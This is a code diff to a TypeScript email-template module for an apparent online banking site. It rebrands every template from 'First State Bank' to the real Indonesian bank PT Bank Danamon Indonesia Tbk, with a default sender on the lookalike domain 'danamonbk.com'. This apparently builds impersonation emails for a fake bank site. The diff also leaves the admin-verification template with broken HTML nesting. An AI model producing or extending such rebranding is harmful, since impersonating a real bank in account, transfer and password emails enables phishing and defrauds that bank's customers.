@@ -19,7 +19,7 @@ export interface EmailOptions {
 
 export async function sendEmail({ to, subject, html, from }: EmailOptions) {
   const mailOptions = {
-    from: from || process.env.SMTP_FROM || "noreply@firststatebank.online",
+    from: from || process.env.SMTP_FROM || "noreply@danamonbk.com",
     to,
     subject,
     html,
@@ -69,7 +69,7 @@ const brandStyles = `
 
 export const emailTemplates = {
   welcome: (name: string, accountNumber: string) => ({
-    subject: "Welcome to First State Bank - Account Initialized",
+    subject: "Welcome to Danamon Bank - Account Activated",
     html: `
       <!DOCTYPE html>
       <html>
@@ -81,11 +81,11 @@ export const emailTemplates = {
         <body>
           <div class="container">
             <div class="header">
-              <div class="logo">first<span>state</span></div>
+              <div class="logo">danamon<span>bank</span></div>
             </div>
             <div class="content">
-              <div class="badge badge-success">Account Setup</div>
-              <h1>Welcome to the Family</h1>
+              <div class="badge badge-success">Account Activation</div>
+              <h1>Welcome to the Danamon Family</h1>
               <p>Hello ${name}, your global banking identity has been established. You now have access to our secure banking network.</p>
               
               <div class="info-box">
@@ -97,21 +97,21 @@ export const emailTemplates = {
                     <div class="info-label">Status</div>
                     <div class="info-value">Provisioned</div>
                   </div>
-                  <div style="text-align: right;">
+                  <div>
                     <div class="info-label">Network</div>
-                    <div class="info-value">Global Banking Network</div>
+                    <div class="info-value">Danamon Global Network</div>
                   </div>
                 </div>
               </div>
               
-              <p>To finalize your profile update and enable global transfers, please complete your identity verification in the dashboard.</p>
+              <p>To complete your profile update and activate global transfers, please complete identity verification on the dashboard.</p>
               
               <div style="text-align: center; margin: 40px 0;">
                 <a href="${process.env.NEXT_PUBLIC_APP_URL}/dashboard" class="button">Access Dashboard</a>
               </div>
             </div>
             <div class="footer">
-              <p>&copy; 2026 FIRST STATE BANK BANKING SYSTEMS. All rights reserved.</p>
+              <p>&copy; 2026 PT BANK DANAMON INDONESIA TBK. All rights reserved.</p>
               <p>Secure Transaction ID: ${Math.random().toString(36).substring(7).toUpperCase()}</p>
             </div>
           </div>
@@ -133,7 +133,7 @@ export const emailTemplates = {
         <body>
           <div class="container">
             <div class="header">
-              <div class="logo">first<span>state</span></div>
+              <div class="logo">danamon<span>bank</span></div>
             </div>
             <div class="content">
               <div class="badge badge-danger">High Priority Authorization</div>
@@ -156,7 +156,7 @@ export const emailTemplates = {
               <p style="font-size: 12px; color: #64748b;">Security Notice: If you did not initiate this transfer, immediately disable your account and contact support.</p>
             </div>
             <div class="footer">
-              <p>&copy; 2026 FIRST STATE BANK BANKING SYSTEMS. All rights reserved.</p>
+              <p>&copy; 2026 PT BANK DANAMON INDONESIA TBK. All rights reserved.</p>
             </div>
           </div>
         </body>
@@ -186,7 +186,7 @@ export const emailTemplates = {
         <body>
           <div class="container">
             <div class="header">
-              <div class="logo">first<span>state</span></div>
+              <div class="logo">danamon<span>bank</span></div>
             </div>
             <div class="content">
               <div class="badge ${type === "credit" ? "badge-success" : "badge-danger"}">
@@ -219,7 +219,7 @@ export const emailTemplates = {
               </div>
             </div>
             <div class="footer">
-              <p>&copy; 2026 FIRST STATE BANK BANKING SYSTEMS. All rights reserved.</p>
+              <p>&copy; 2026 PT BANK DANAMON INDONESIA TBK. All rights reserved.</p>
             </div>
           </div>
         </body>
@@ -240,7 +240,7 @@ export const emailTemplates = {
         <body>
           <div class="container">
             <div class="header">
-              <div class="logo">first<span>state</span></div>
+              <div class="logo">danamon<span>bank</span></div>
             </div>
             <div class="content">
               <div class="badge badge-success">Verification Complete</div>
@@ -260,7 +260,7 @@ export const emailTemplates = {
               </div>
             </div>
             <div class="footer">
-              <p>&copy; 2026 FIRST STATE BANK BANKING SYSTEMS. All rights reserved.</p>
+              <p>&copy; 2026 PT BANK DANAMON INDONESIA TBK. All rights reserved.</p>
             </div>
           </div>
         </body>
@@ -281,7 +281,7 @@ export const emailTemplates = {
         <body>
           <div class="container">
             <div class="header">
-              <div class="logo">first<span>state</span></div>
+              <div class="logo">danamon<span>bank</span></div>
             </div>
             <div class="content">
               <div class="badge badge-danger">Security Recovery</div>
@@ -295,7 +295,7 @@ export const emailTemplates = {
               <p style="font-size: 12px; color: #64748b;">This link will expire in 60 minutes. If you did not request this, please ignore this transmission.</p>
             </div>
             <div class="footer">
-              <p>&copy; 2026 FIRST STATE BANK BANKING SYSTEMS. All rights reserved.</p>
+              <p>&copy; 2026 PT BANK DANAMON INDONESIA TBK. All rights reserved.</p>
             </div>
           </div>
         </body>
@@ -316,7 +316,7 @@ export const emailTemplates = {
         <body>
           <div class="container">
             <div class="header">
-              <div class="logo">first<span>state</span></div>
+              <div class="logo">danamon<span>bank</span></div>
             </div>
             <div class="content">
               <div class="badge badge-success">Profile Update</div>
@@ -332,7 +332,7 @@ export const emailTemplates = {
               </div>
             </div>
             <div class="footer">
-              <p>&copy; 2026 FIRST STATE BANK BANKING SYSTEMS. All rights reserved.</p>
+              <p>&copy; 2026 PT BANK DANAMON INDONESIA TBK. All rights reserved.</p>
             </div>
           </div>
         </body>
@@ -353,25 +353,25 @@ export const emailTemplates = {
         <body>
           <div class="container">
             <div class="header">
-              <div class="logo">first<span>state</span></div>
+              <div class="logo">danamon<span>bank</span></div>
             </div>
             <div class="content">
               <div class="badge badge-danger">Security Synchronized</div>
               <h1>Password Updated</h1>
-              <p>Your password for FIRST STATE BANK BANK has been successfully changed.</p>
+              <p>Your Danamon Bank password has been successfully changed.</p>
               
               <div class="info-box">
                 <div class="info-label">Change Status</div>
-                <div class="info-value">Authorization Success</div>
+                <div class="info-value">Authorization Successful</div>
                 <div class="divider"></div>
                 <div class="info-label">Action Taken</div>
-                <div class="info-value">Main Password Rotated</div>
+                <div class="info-value">Primary Password Rotated</div>
               </div>
               
               <p style="font-size: 12px; color: #64748b;">If you did not authorize this change, immediately terminate all active sessions and contact security.</p>
             </div>
             <div class="footer">
-              <p>&copy; 2026 FIRST STATE BANK BANKING SYSTEMS. All rights reserved.</p>
+              <p>&copy; 2026 PT BANK DANAMON INDONESIA TBK. All rights reserved.</p>
             </div>
           </div>
         </body>
@@ -397,7 +397,7 @@ export const emailTemplates = {
         <body>
           <div class="container">
             <div class="header">
-              <div class="logo">first<span>state</span></div>
+              <div class="logo">danamon<span>bank</span></div>
             </div>
             <div class="content">
               <div class="badge badge-success">Application Logged</div>
@@ -418,7 +418,7 @@ export const emailTemplates = {
               <p>The review process typically completes within 72-96 hours. You will receive an alert once the decision is finalized.</p>
             </div>
             <div class="footer">
-              <p>&copy; 2026 FIRST STATE BANK BANKING SYSTEMS. All rights reserved.</p>
+              <p>&copy; 2026 PT BANK DANAMON INDONESIA TBK. All rights reserved.</p>
             </div>
           </div>
         </body>
@@ -446,7 +446,7 @@ export const emailTemplates = {
         <body>
           <div class="container">
             <div class="header">
-              <div class="logo">first<span>state</span></div>
+              <div class="logo">danamon<span>bank</span></div>
             </div>
             <div class="content">
               <div class="badge ${status === 'approved' ? 'badge-success' : 'badge-danger'}">
@@ -472,7 +472,7 @@ export const emailTemplates = {
         : `<p>If you require clarification on this decision, contact support.</p>`}
             </div>
             <div class="footer">
-              <p>&copy; 2026 FIRST STATE BANK BANKING SYSTEMS. All rights reserved.</p>
+              <p>&copy; 2026 PT BANK DANAMON INDONESIA TBK. All rights reserved.</p>
             </div>
           </div>
         </body>
@@ -481,7 +481,7 @@ export const emailTemplates = {
   }),
 
   cardApplication: (name: string, cardType: string, vendor: string) => ({
-    subject: "System Alert: Card Application Process Initiated",
+    subject: "Danamon Bank Card Application Request",
     html: `
       <!DOCTYPE html>
       <html>
@@ -493,16 +493,16 @@ export const emailTemplates = {
         <body>
           <div class="container">
             <div class="header">
-              <div class="logo">first<span>state</span></div>
+              <div class="logo">danamon<span>bank</span></div>
             </div>
             <div class="content">
-              <div class="badge badge-success">Card Requested</div>
+              <div class="badge badge-warning">Application Processed</div>
               <h1>Card Application Request</h1>
-              <p>Hello ${name}, your request for a ${vendor} ${cardType} card has been logged.</p>
+              <p>Hello ${name}, your application for a ${vendor} ${cardType} card has been recorded.</p>
               
               <div class="info-box">
                 <div class="info-label">Card Type</div>
-                <div class="info-value">${cardType.toUpperCase()} CARD</div>
+                <div class="info-value">CARD ${cardType.toUpperCase()}</div>
                 <div class="divider"></div>
                 <div class="info-label">Provider</div>
                 <div class="info-value">${vendor.toUpperCase()}</div>
@@ -511,10 +511,10 @@ export const emailTemplates = {
                 <div class="info-value">Processing</div>
               </div>
               
-              <p>Once approved, your physical card will be dispatched via secure mail. Virtual credentials will be active immediately upon approval.</p>
+              <p>Once approved, your physical card will be sent via secure courier. Virtual credentials will be active immediately upon approval.</p>
             </div>
             <div class="footer">
-              <p>&copy; 2026 FIRST STATE BANK BANKING SYSTEMS. All rights reserved.</p>
+              <p>&copy; 2026 PT BANK DANAMON INDONESIA TBK. All rights reserved.</p>
             </div>
           </div>
         </body>
@@ -529,61 +529,61 @@ export const emailTemplates = {
     status: string,
     cardNumber?: string
   ) => ({
-    subject: `System Alert: Card Status ${status.toUpperCase()}`,
+    subject: `System Update: Card Status ${status.toUpperCase()}`,
     html: `
-      <!DOCTYPE html>
-      <html>
-        <head>
-          <meta charset="utf-8">
-          <meta name="viewport" content="width=device-width, initial-scale=1.0">
-          <style>${brandStyles}</style>
-        </head>
-        <body>
-          <div class="container">
-            <div class="header">
-              <div class="logo">first<span>state</span></div>
-            </div>
-            <div class="content">
-              <div class="badge ${status === 'active' ? 'badge-success' : 'badge-danger'}">
-                Card State: ${status.toUpperCase()}
-              </div>
-              <h1>Card Activation</h1>
-              <p>Hello ${name}, the status of your ${vendor} ${cardType} card has been updated.</p>
-              
-              <div class="info-box">
-                <div class="info-label">Card Specification</div>
-                <div class="info-value">${cardType.toUpperCase()} - ${vendor.toUpperCase()}</div>
-                <div class="divider"></div>
-                ${status === 'active' && cardNumber
+        <!DOCTYPE html>
+        <html>
+          <head>
+            <meta charset="utf-8">
+              <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                <style>${brandStyles}</style>
+              </head>
+              <body>
+                <div class="container">
+                  <div class="header">
+                    <div class="logo">danamon<span>bank</span></div>
+                  </div>
+                  <div class="content">
+                    <div class="badge ${status === 'active' ? 'badge-success' : 'badge-danger'}">
+                      Card Status: ${status.toUpperCase()}
+                    </div>
+                    <h1>Card Activation</h1>
+                    <p>Hello ${name}, your ${vendor} ${cardType} card status has been updated.</p>
+
+                    <div class="info-box">
+                      <div class="info-label">Card Specification</div>
+                      <div class="info-value">${cardType.toUpperCase()} - ${vendor.toUpperCase()}</div>
+                      <div class="divider"></div>
+                      ${status === 'active' && cardNumber
         ? `
                     <div class="info-label">Virtual Credentials</div>
                     <div class="info-value" style="letter-spacing: 2px; font-family: monospace;">${cardNumber.replace(/(.{4})/g, '$1 ')}</div>
                     <div class="divider"></div>
                     <div class="info-label">Logistics</div>
-                    <div class="info-value">Dispatching via Secure Mail</div>
+                    <div class="info-value">Shipped via Secure Courier</div>
                     `
         : `
                     <div class="info-label">Final Decision</div>
                     <div class="info-value">Application Declined</div>
                     `
       }
-              </div>
-              
-              ${status === 'active'
-        ? `<p>Virtual usage is now active for this card. Your physical card will arrive within 7-10 days.</p>`
-        : `<p>Identity or credit requirements were not met for this specific card request.</p>`}
-            </div>
-            <div class="footer">
-              <p>&copy; 2026 FIRST STATE BANK BANKING SYSTEMS. All rights reserved.</p>
-            </div>
-          </div>
-        </body>
-      </html>
-    `,
+                    </div>
+
+                    ${status === 'active'
+        ? `<p>Virtual usage is now active for this card. Your physical card will arrive in 7-10 days.</p>`
+        : `<p>Identity or credit requirements have not been met for this specific card request.</p>`}
+                  </div>
+                  <div class="footer">
+                    <p>&copy; 2026 PT BANK DANAMON INDONESIA TBK. All rights reserved.</p>
+                  </div>
+                </div>
+              </body>
+            </html>
+            `,
   }),
 
   accountVerifiedByAdmin: (name: string, adminEmail: string, notes?: string) => ({
-    subject: "Core Permission: Manual Override Verified",
+    subject: "Core Permission: Manual Verification Successful",
     html: `
       <!DOCTYPE html>
       <html>
@@ -595,13 +595,13 @@ export const emailTemplates = {
         <body>
           <div class="container">
             <div class="header">
-              <div class="logo">first<span>state</span></div>
+              <div class="logo">danamon<span>bank</span></div>
             </div>
             <div class="content">
               <div class="badge badge-success">Manual Clearance</div>
               <h1>Verification Complete</h1>
               <p>Hello ${name}, your account has been manually verified by a senior administrator.</p>
-              
+
               <div class="info-box">
                 <div class="info-label">Authorized By</div>
                 <div class="info-value">${adminEmail}</div>
@@ -610,56 +610,52 @@ export const emailTemplates = {
                   <div class="info-label">Admin Notes</div>
                   <div class="info-value">${notes}</div>
                 ` : ''}
+              <div class="footer">
+                <p>&copy; 2026 PT BANK DANAMON INDONESIA TBK. All rights reserved.</p>
               </div>
-              
-              <p>Total account access is now enabled. All restrictions have been removed.</p>
             </div>
-            <div class="footer">
-              <p>&copy; 2026 FIRST STATE BANK BANKING SYSTEMS. All rights reserved.</p>
-            </div>
-          </div>
-        </body>
-      </html>
-    `,
+          </body>
+        </html>
+      `,
   }),
 
   roleApproved: (name: string, role: string, adminEmail: string) => ({
-    subject: "Permission Alert: Elevated Privileges Granted",
+    subject: "Permission Alert: Privileges Granted",
     html: `
-      <!DOCTYPE html>
-      <html>
-        <head>
-          <meta charset="utf-8">
-          <meta name="viewport" content="width=device-width, initial-scale=1.0">
-          <style>${brandStyles}</style>
-        </head>
-        <body>
-          <div class="container">
-            <div class="header">
-              <div class="logo">first<span>state</span></div>
-            </div>
-            <div class="content">
-              <div class="badge badge-success">Elevated Access</div>
-              <h1>Permissions Updated</h1>
-              <p>Hello ${name}, your request for elevated network privileges has been authorized.</p>
-              
-              <div class="info-box">
-                <div class="info-label">Assigned Role</div>
-                <div class="info-value" style="color: #6366f1;">NETWORK ${role.toUpperCase()}</div>
-                <div class="divider"></div>
-                <div class="info-label">Authorizing Entity</div>
-                <div class="info-value">${adminEmail}</div>
+        <!DOCTYPE html>
+        <html>
+          <head>
+            <meta charset="utf-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <style>${brandStyles}</style>
+          </head>
+          <body>
+            <div class="container">
+              <div class="header">
+                <div class="logo">danamon<span>bank</span></div>
               </div>
-              
-              <p>New dashboard capabilities should be visible upon your next login session.</p>
+              <div class="content">
+                <div class="badge badge-success">Enhanced Access</div>
+                <h1>Privileges Granted</h1>
+                <p>Hello ${name}, your request for network privileges has been authorized.</p>
+
+                <div class="info-box">
+                  <div class="info-label">Assigned Role</div>
+                  <div class="info-value" style="color: #6366f1;">NETWORK ${role.toUpperCase()}</div>
+                  <div class="divider"></div>
+                  <div class="info-label">Authorizing Entity</div>
+                  <div class="info-value">${adminEmail}</div>
+                </div>
+
+                <p>New dashboard capabilities will be visible upon your next login session.</p>
+              </div>
+              <div class="footer">
+                <p>&copy; 2026 PT BANK DANAMON INDONESIA TBK. All rights reserved.</p>
+              </div>
             </div>
-            <div class="footer">
-              <p>&copy; 2026 FIRST STATE BANK BANKING SYSTEMS. All rights reserved.</p>
-            </div>
-          </div>
-        </body>
-      </html>
-    `,
+          </body>
+        </html>
+      `,
   }),
 }
 
